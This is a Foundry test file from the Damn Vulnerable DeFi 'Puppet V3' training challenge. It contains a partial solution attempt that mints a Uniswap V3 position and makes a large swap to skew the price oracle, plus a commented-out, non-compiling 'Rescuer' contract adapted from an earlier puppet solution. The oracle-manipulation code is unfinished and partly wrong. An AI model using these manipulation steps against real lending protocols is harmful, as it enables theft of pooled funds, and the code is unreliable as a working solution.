// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {FullMath} from "@uniswap/v3-core/contracts/libraries/FullMath.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";


contract PuppetV3Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint24 constant FEE = 3000;

    IUniswapV3Factory uniswapFactory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
    INonfungiblePositionManager positionManager =
        INonfungiblePositionManager(payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));
    WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    DamnValuableToken token;
    PuppetV3Pool lendingPool;

    uint256 initialBlockTimestamp;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 15450164);

        startHoax(deployer);

        // Set player's initial balance
        deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deployer wraps ETH in WETH
        weth.deposit{value: UNISWAP_INITIAL_WETH_LIQUIDITY}();

        // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
        token = new DamnValuableToken();

        // Create Uniswap v3 pool
        bool isWethFirst = address(weth) < address(token);
        address token0 = isWethFirst ? address(weth) : address(token);
        address token1 = isWethFirst ? address(token) : address(weth);
        positionManager.createAndInitializePoolIfNecessary({
            token0: token0,
            token1: token1,
            fee: FEE,
            sqrtPriceX96: _encodePriceSqrt(1, 1)
        });

        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
        uniswapPool.increaseObservationCardinalityNext(40);

        // Deployer adds liquidity at current price to Uniswap V3 exchange
        weth.approve(address(positionManager), type(uint256).max);
        token.approve(address(positionManager), type(uint256).max);
        positionManager.mint(
            INonfungiblePositionManager.MintParams({
                token0: token0,
                token1: token1,
                tickLower: -60,
                tickUpper: 60,
                fee: FEE,
                recipient: deployer,
                amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
                amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );

        console.log("Deployer WETH balance after adding liquidity:", weth.balanceOf(deployer));
        console.log("Deployer DVT balance after adding liquidity:", token.balanceOf(deployer));
        console.log("Uniswap pool WETH balance", weth.balanceOf(address(uniswapPool)));
        console.log("Uniswap pool DVT balance", token.balanceOf(address(uniswapPool)));

        // Deploy the lending pool
        lendingPool = new PuppetV3Pool(weth, token, uniswapPool);

        // Setup initial token balances of lending pool and player
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), LENDING_POOL_INITIAL_TOKEN_BALANCE);

        // Some time passes
        skip(3 days);

        initialBlockTimestamp = block.timestamp;

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertGt(initialBlockTimestamp, 0);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV3() public checkSolvedByPlayer {
        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));

        require(uniswapPool.token0() == address(token), "Token0 is expected to be DVT");

        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
        weth.approve(address(positionManager), type(uint256).max);
        token.approve(address(positionManager), type(uint256).max);
        // bool isWethFirst = address(weth) < address(token);
        // console.log("weth is token0?", isWethFirst); // false

        console.log("Player WETH balance before minting position:", weth.balanceOf(player));
        console.log("Player DVT balance before minting position:", token.balanceOf(player));


        positionManager.mint(
            INonfungiblePositionManager.MintParams({
                token0: address(token),
                token1: address(weth),
                tickLower: -150_000,
                tickUpper: 0,
                fee: FEE,
                recipient: player,
                amount0Desired: 1 ether,
                amount1Desired: uint256(1 ether / uint256(887270)),
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );

        console.log("Player WETH balance after minting position:", weth.balanceOf(player));
        console.log("Player DVT balance after minting position:", token.balanceOf(player));
        console.log("Uniswap pool WETH balance", weth.balanceOf(address(uniswapPool)));
        console.log("Uniswap pool DVT balance", token.balanceOf(address(uniswapPool)));



        weth.approve(address(uniswapPool), type(uint256).max);
        token.approve(address(uniswapPool), type(uint256).max);

        (uint160 sqrtPriceX96, , , , , , ) = uniswapPool.slot0();

        // Price = (sqrtPriceX96^2 * 10^decimals0) / (2^192 * 10^decimals1)
        uint256 Q192 = 1 << 192;
        // no adjustment for decimals, since both WETH and DVT have 18 decimals
        uint256 price = FullMath.mulDiv(
            uint256(sqrtPriceX96), // Cast to uint256 for mulDiv
            uint256(sqrtPriceX96),
            Q192
        );

        console.log("Current price of DVT in WETH:", price);

        (int256 amount0, int256 amount1) = uniswapPool.swap(
            address(this),
            true,
            100 ether ,
            uint160(1 << 96) * 10 / 100,
            bytes("")
        );



        // uint160 sqrtPriceLimitX96 = currentSqrtPriceX96 / 10;
        // uint160 sqrtPriceLimitX96 = currentSqrtPriceX96 * 10 ether;

        // uint160 sqrtPriceLimitX96 = currentSqrtPriceX96 * 11_000 / 10_000;

        // weth.approve(address(uniswapPool), type(uint256).max);
        // token.approve(address(uniswapPool), type(uint256).max);

        // (int256 amount0, int256 amount1) = uniswapPool.swap(
        //     address(this),
        //     false, // DVT -> WETH
        //     1000,
        //     sqrtPriceLimitX96,
        //     bytes("")
        // );
    }

    function uniswapV3SwapCallback(
        int256 amount0,
        int256 amount1,
        bytes calldata data
    ) public{
        console.log("UniswapV3SwapCallback called with amount0", amount0);
        console.log("UniswapV3SwapCallback called with amount1", amount1);
        weth.transfer(msg.sender, uint256(amount1));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertLt(block.timestamp - initialBlockTimestamp, 115, "Too much time passed");
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), LENDING_POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }

    function _encodePriceSqrt(uint256 reserve1, uint256 reserve0) private pure returns (uint160) {
        return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
    }
}


// contract Rescuer {
//     DamnValuableToken token;
//     PuppetV3Pool lendingPool;
//     address recovery;

//     constructor(


//     ) payable {
//         token = _token;
//         lendingPool = _lendingPool;
//         uniswapV2Exchange = _uniswapV2Exchange;
//         uniswapV2Router = _uniswapV2Router;
//         weth = _weth;
//         recovery = _recovery;
//     }

//     function rescue() external {
//         token.approve(address(uniswapV2Router), type(uint256).max);

//         address[] memory path = new address[](2);
//         path[0] = address(token);
//         path[1] = address(weth);

//         uniswapV2Router.swapExactTokensForETH(
//             PLAYER_INITIAL_TOKEN_BALANCE, // amountIn
//             1, // amountOutMin
//             path,
//             address(this), // to
//             block.timestamp + 10 // deadline
//         );

//         (uint112 reserve0, uint112 reserve1, ) = uniswapV2Exchange.getReserves();
//         address token0 = uniswapV2Exchange.token0();

//         uint256 price; // price of token in WETH, using reserves from the exchange
//         if (token0 == address(token)) {
//             price = (uint256(reserve1) * 1 ether) / uint256(reserve0);
//         } else {
//             price = (uint256(reserve0) * 1 ether) / uint256(reserve1);
//         }


//         console.log("Oracle price (1 token per ETH): ", price);

//         weth.deposit{value: address(this).balance}();

//         weth.approve(address(lendingPool), type(uint256).max);

//         lendingPool.borrow(1_000_000 ether);

//         require(token.balanceOf(address(lendingPool)) == 0, "All tokens should have been borrowed");

//         token.transfer(recovery, token.balanceOf(address(this)));

//         weth.transfer(msg.sender, weth.balanceOf(address(this)));

//     }

//     receive()external payable {}
// }
